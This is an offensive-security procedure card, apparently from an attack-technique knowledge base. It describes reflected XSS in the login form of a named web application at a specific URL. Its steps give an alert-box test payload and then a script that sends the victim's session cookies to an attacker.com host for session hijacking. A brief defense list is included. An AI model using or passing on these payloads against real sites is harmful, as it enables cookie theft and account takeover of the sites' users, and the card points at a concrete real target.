---
tags:
  - xss
  - reflected-xss
  - script-injection
  - login-form
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:36.994Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 5d3d738c-3839-467f-a607-5c4b734048f6
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-via-Login-Form

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the login page of the 8x8 ContactNow application by injecting a malicious JavaScript payload into user input fields like username or password. The lack of proper input encoding allows the script to reflect back and execute in the victim's browser, potentially leading to session hijacking, data theft, or phishing attacks.

## Description

The vulnerability affects an older version of the 8x8 ContactNow web application hosted at http://axa.dxi.eu/. When a user submits the login form, user-supplied input is inadequately sanitized and encoded, enabling attackers to inject HTML or JavaScript that executes immediately in the context of the page. This was identified through manual testing by a security researcher via HackerOne. The attack requires no authentication and can be triggered by tricking a user into submitting a crafted link or form. Expected outcomes include arbitrary code execution, cookie theft, or keylogging if advanced payloads are used. Prerequisites include access to a web browser and the target URL.

## Requirements

1. Web browser with developer tools (e.g., Chrome DevTools) for inspecting and testing payloads
2. Access to the target login page at http://axa.dxi.eu/
3. Basic knowledge of JavaScript payloads for XSS exploitation

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding) on all user inputs in login forms
- Deploy Content Security Policy (CSP) headers to restrict script execution
- Use Web Application Firewalls (WAF) to detect and block common XSS payloads
- Monitor server logs for suspicious input patterns like script tags or unusual characters

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser session
2. Steal sensitive data such as session cookies or form inputs
3. Demonstrate potential for account takeover or phishing escalation

## Instructions

### Step 1: Navigate to the Target Login Page

**Context**: Access the vulnerable login form to prepare for payload injection. This step confirms the target environment and allows inspection of the form fields.

Open a web browser and navigate to http://axa.dxi.eu/. Locate the login form, typically containing username and password fields. Use developer tools (F12) to inspect the form elements and identify which fields reflect user input directly in the response.

**Expected Output**: The login page loads, displaying input fields without errors.

### Step 2: Craft and Inject the XSS Payload

**Context**: Test the vulnerability by entering a simple payload that, if reflected without encoding, will execute JavaScript. Start with a benign payload to confirm execution before escalating.

Enter the following payload in the username or password field: `<script>alert('XSS')</script>`. Submit the form by clicking the login button or pressing Enter.

> This payload attempts to inject a script tag that triggers a JavaScript alert. If the input is reflected back into the HTML without proper escaping (e.g., converting < to &lt;), the script will execute, popping up an alert box confirming the vulnerability.

**Expected Output**: An alert dialog appears in the browser with the message 'XSS', indicating successful script execution.

### Step 3: Escalate the Payload for Impact

**Context**: Once confirmed, use a more malicious payload to simulate real-world impact, such as stealing cookies or redirecting the user.

Replace the payload with: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. Submit the form again.

> This payload exfiltrates the user's session cookies to an attacker-controlled server, enabling session hijacking. In a real attack, the attacker would host a logging server at the specified URL to capture the data.

**Expected Output**: The browser redirects to the attacker URL with appended cookie data, or the request is logged on the attacker's server.

### Step 4: Verify and Document the Exploitation

**Context**: Confirm the vulnerability's scope and gather evidence for reporting or mitigation.

Inspect the page source after submission using developer tools to locate the reflected payload. Check network requests for any data exfiltration. Document the exact input fields affected and the unencoded output.

**Expected Output**: Page source shows raw payload (e.g., <script> tags intact), and any exfiltrated data is captured.

**Success Indicators**:
- Alert or redirect occurs upon payload submission
- Reflected input visible in HTML source without encoding
- Captured data (e.g., cookies) received by attacker server

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[login-form]]
